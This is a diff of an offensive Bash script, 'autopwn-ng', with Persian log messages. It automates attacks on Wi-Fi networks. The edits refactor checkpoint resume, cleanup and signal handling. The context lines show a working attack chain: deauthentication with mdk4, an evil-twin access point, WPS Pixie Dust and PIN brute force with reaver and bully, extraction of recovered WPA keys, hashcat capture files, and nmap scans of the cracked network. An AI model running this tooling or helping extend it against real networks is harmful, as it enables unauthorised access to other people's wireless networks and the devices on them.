@@ -25,12 +25,7 @@ AUTO=0
 RESUME=0
 WLIMIT=3
 CHECKPOINT="/tmp/autopwn-ng.checkpoint"
-WORK="$(mktemp -d /tmp/autopwn.XXXXXX)"
-POT="$WORK/hashcat.pot"
-HASH="$WORK/targets.hc22000"
-CAP="$WORK/capture.pcapng"
-REPORT="$WORK/report"
-mkdir -p "$REPORT"
+WORK=""
 
 c(){ printf '\033[1;36m[*]\033[0m %s\n' "$*"; }
 ok(){ printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
@@ -97,11 +92,6 @@ if [ "$RESUME" -eq 1 ]; then
     . "$CHECKPOINT"
     if [ -n "${CKPT_WORK:-}" ] && [ -d "$CKPT_WORK" ]; then
       WORK="$CKPT_WORK"
-      POT="$WORK/hashcat.pot"
-      HASH="$WORK/targets.hc22000"
-      CAP="$WORK/capture.pcapng"
-      REPORT="$WORK/report"
-      mkdir -p "$REPORT"
       SKIP_TO=$(( ${CKPT_PHASE:-0} + 1 ))
       ok "ادامه از فاز $SKIP_TO (آخرین فاز تکمیل‌شده: ${CKPT_PHASE:-0})"
       ok "دایرکتوری کار: $WORK"
@@ -114,6 +104,16 @@ if [ "$RESUME" -eq 1 ]; then
     RESUME=0
   fi
 fi
+
+# Create work directory if not resuming from checkpoint
+if [ -z "${WORK:-}" ]; then
+  WORK="$(mktemp -d /tmp/autopwn.XXXXXX)"
+fi
+POT="$WORK/hashcat.pot"
+HASH="$WORK/targets.hc22000"
+CAP="$WORK/capture.pcapng"
+REPORT="$WORK/report"
+mkdir -p "$REPORT"
 
 [ "$DRY_RUN" = 1 ] && {
   echo "SIMULATION MODE: autopwn-ng dry-run / --simulate"
@@ -194,15 +194,17 @@ command -v mdk4 >/dev/null || warn "mdk4 نصب نیست؛ دِاوث ضعیف�
 
 # ---------- پاکسازی ----------
 cleanup(){
-  [ -n "${HK_PID:-}" ] && kill "$HK_PID" 2>/dev/null
-  [ -n "${MDK_PID:-}" ] && kill "$MDK_PID" 2>/dev/null
-  [ -n "${TWIN_PID:-}" ] && kill "$TWIN_PID" 2>/dev/null
+  [ -n "${HK_PID:-}" ] && { kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; }
+  [ -n "${MDK_PID:-}" ] && { kill "$MDK_PID" 2>/dev/null; wait "$MDK_PID" 2>/dev/null; }
+  [ -n "${TWIN_PID:-}" ] && { kill "$TWIN_PID" 2>/dev/null; wait "$TWIN_PID" 2>/dev/null; }
   [ -n "${MON:-}" ] && airmon-ng stop "$MON" >/dev/null 2>&1
   for i in "$IFACE" "$IFACE2"; do [ -n "$i" ] && ip link set "$i" up 2>/dev/null; done
   systemctl restart NetworkManager >/dev/null 2>&1 || true
   hr; c "خروجی‌ها: $WORK"
 }
-trap cleanup EXIT INT TERM
+trap cleanup EXIT
+trap 'exit 130' INT
+trap 'exit 143' TERM
 
 # ---------- فاز ۰: آماده‌سازی ----------
 hr; c "فاز ۰ — آماده‌سازی"
@@ -210,7 +212,7 @@ if [ -z "$IFACE" ]; then IFACE=$(iw dev | awk '/Interface/{print $2; exit}'); fi
 [ -n "$IFACE" ] || { err "دانگل وای‌فای پیدا نشد."; exit 1; }
 
 if [ -z "$IFACE2" ]; then
-  IFACE2=$(iw dev | awk '/Interface/{print $2}' | grep -vxF "$IFACE" | head -1)
+  IFACE2=$(iw dev | awk -v skip="$IFACE" '/Interface/ && $2 != skip {print $2; exit}')
 fi
 if [ -n "$IFACE2" ]; then
   ok "دانگل دوم برای evil twin: $IFACE2"
@@ -248,7 +250,7 @@ if [ "$PROFILE" = stealth ]; then
 fi
 
 # ---------- فاز ۰.۵: شناسایی منفعل (kismet) ----------
-if [ "$SKIP_TO" -le 1 ] && command -v kismet >/dev/null 2>&1; then
+if [ "$SKIP_TO" -le 1 ] && command -v kismet >/dev/null; then
   hr; c "فاز ۰.۵ — شناسایی منفعل با kismet"
   timeout 30 kismet -c "$MON" --daemonize 2>/dev/null || true
   sleep 10
@@ -293,7 +295,7 @@ else
 fi
 
 # tshark: تحلیل بسته‌ها برای شناسایی Enterprise/WPS/کلاینت‌ها
-if command -v tshark >/dev/null 2>&1; then
+if command -v tshark >/dev/null; then
   c "  → tshark تحلیل بسته‌ها"
   tshark -r "$CAP" -Y 'eap' -T fields -e wlan.sa -e eap.identity 2>/dev/null | sort -u > "$WORK/eap-idents.txt"
   tshark -r "$CAP" -Y 'wps' -T fields -e wlan.bssid 2>/dev/null | sort -u > "$WORK/wps-bssids.txt"
@@ -434,7 +436,7 @@ fi
 if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; then
   hr; c "فاز ۴ — WPS (Pixie Dust + Brute)"
   # wash: اسکن دقیق WPS-enabled APها (بهتر از parsing CSV)
-  if command -v wash >/dev/null 2>&1; then
+  if command -v wash >/dev/null; then
     wash -i "$MON" -o "$WORK/wps-scan.txt" 2>/dev/null &
     WASH_PID=$!
     sleep 15
@@ -453,14 +455,14 @@ if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; th
     grep -q "$b" "$WORK/cracked.txt" 2>/dev/null && continue
     [ -z "$ch" ] && continue
     # reaver Pixie Dust
-    if command -v reaver >/dev/null 2>&1; then
+    if command -v reaver >/dev/null; then
       c "  → reaver -K 1 روی $b"
       timeout 240 reaver -i "$MON" -b "$b" -c "$ch" -K 1 -N -vv -d 5 > "$WORK/wps-$b.txt" 2>&1
       k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-$b.txt")
       [ -n "$k" ] && ok "WPS (reaver) → $k" && echo "$b|$k|WPS-reaver" >> "$WORK/cracked.txt" && continue
     fi
     # bully: brute-force PIN (alternative to reaver)
-    if command -v bully >/dev/null 2>&1; then
+    if command -v bully >/dev/null; then
       c "  → bully روی $b"
       timeout 300 bully -b "$b" -c "$ch" -d "$WORK/bully-$b" "$MON" > "$WORK/bully-$b.txt" 2>&1
       k=$(awk -F'WPA PSK: ' 'NF>1{print $2; exit}' "$WORK/bully-$b.txt" 2>/dev/null | head -1)
@@ -528,7 +530,7 @@ if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; t
   first=$(head -1 "$WORK/cracked.txt")
   b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
   # nmap: اسکن شبکهٔ کرک‌شده برای شناسایی سرویس‌ها
-  if command -v nmap >/dev/null 2>&1; then
+  if command -v nmap >/dev/null; then
     c "  → nmap اسکن شبکه"
     nmap -sn 192.168.1.0/24 -oN "$REPORT/nmap-hosts.txt" 2>/dev/null || true
     nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24 -oN "$REPORT/nmap-services.txt" 2>/dev/null || true
